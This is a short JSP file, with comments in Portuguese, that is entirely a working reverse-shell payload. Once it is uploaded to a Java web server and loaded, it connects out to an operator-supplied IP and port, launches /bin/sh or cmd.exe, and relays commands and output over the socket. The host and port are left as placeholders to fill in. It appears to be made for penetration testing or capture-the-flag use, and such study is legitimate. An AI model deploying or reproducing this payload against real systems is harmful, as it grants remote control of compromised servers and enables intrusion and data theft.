<%@ page import="java.io.*, java.net.*" %>
<%
	String host = "[vpn_ip_address]"; // seu IP
	int port = [port];    	// porta que você vai escutar
	String cmd = "/bin/sh"; // para Linux (se for Windows, seria "cmd.exe")
    
	Socket socket = new Socket(host, port);
	Process process = new ProcessBuilder(cmd).redirectErrorStream(true).start();
    
	InputStream pi = process.getInputStream(), pe = process.getErrorStream(), si = socket.getInputStream();
	OutputStream po = process.getOutputStream(), so = socket.getOutputStream();
    
	while (!socket.isClosed()) {
    	while (pi.available() > 0) so.write(pi.read());
    	while (pe.available() > 0) so.write(pe.read());
    	while (si.available() > 0) po.write(si.read());
    	so.flush();
    	po.flush();
    	Thread.sleep(50);
    	try {
        	process.exitValue();
        	break;
    	} catch (Exception e) {
    	}
	}
	process.destroy();
	socket.close();
%>
